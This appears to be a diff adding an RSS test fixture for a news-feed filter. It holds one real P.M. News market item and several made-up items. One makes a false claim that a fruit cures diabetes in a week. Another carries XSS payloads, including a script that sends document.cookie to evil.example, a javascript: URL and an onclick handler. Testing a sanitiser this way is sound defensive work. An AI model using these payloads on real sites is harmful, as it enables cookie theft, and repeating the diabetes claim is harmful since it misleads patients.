@@ -1,0 +1,43 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!-- Test feed. Item 1 is a real P.M. News item (9 Oct 2026); the others are made up to test each rule. -->
+<rss version="2.0" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:media="http://search.yahoo.com/mrss/">
+<channel>
+<title>Test feed</title>
+<item>
+	<title>Stock Market ends seven-day losing streak, adds ₦209bn</title>
+	<link>https://pmnewsnigeria.com/2026/10/09/stock-market-ends-seven-day-losing-streak-adds-%e2%82%a6209bn/</link>
+	<pubDate>Fri, 09 Oct 2026 22:59:10 +0000</pubDate>
+	<category><![CDATA[Business]]></category>
+	<description><![CDATA[The market capitalisation rose by 0.13 per cent to ₦161.260 trillion from ₦161.051 trillion recorded in the previous session, representing a gain of ₦209 billion.]]></description>
+	<content:encoded><![CDATA[<p><img src="https://pmnewsnigeria.com/wp-content/uploads/ngx.jpg" alt="" /></p><p>The market capitalisation rose...</p>]]></content:encoded>
+</item>
+<item>
+	<title>Doctors HATE this one fruit that cures diabetes in 7 days!!!</title>
+	<link>https://metropulse.example/fruit-diabetes</link>
+	<pubDate>Thu, 08 Oct 2026 11:15:00 +0100</pubDate>
+	<category>Health</category>
+	<media:content url="https://metropulse.example/img/fruit.jpg" medium="image" />
+	<description><![CDATA[<p>A viral post claims that eating a single tropical fruit every morning reverses type 2 diabetes within a week.</p><p>The post <a href="https://metropulse.example/fruit-diabetes">Doctors HATE this one fruit</a> appeared first on <a href="https://metropulse.example">Metro Pulse</a>.</p>]]></description>
+</item>
+<item>
+	<title>Governor &lt;script&gt;alert('xss')&lt;/script&gt; opens new road</title>
+	<link>https://lagoswire.example/new-road</link>
+	<pubDate>Wed, 07 Oct 2026 09:00:00 +0100</pubDate>
+	<category>Politics</category>
+	<enclosure url="javascript:alert(1)" type="image/jpeg" />
+	<description><![CDATA[<script>document.location='https://evil.example/?c='+document.cookie</script><p onclick="alert(1)">The new road links two towns.</p><style>body{display:none}</style>]]></description>
+</item>
+<item>
+	<title>Sponsored: Win an iPhone 17 today</title>
+	<link>https://viraltoday.example/win-iphone</link>
+	<pubDate>Wed, 07 Oct 2026 08:00:00 +0100</pubDate>
+	<category>Promotions</category>
+	<description>Click to enter.</description>
+</item>
+<item>
+	<title></title>
+	<link>https://viraltoday.example/no-title</link>
+	<description>An item with no headline.</description>
+</item>
+</channel>
+</rss>
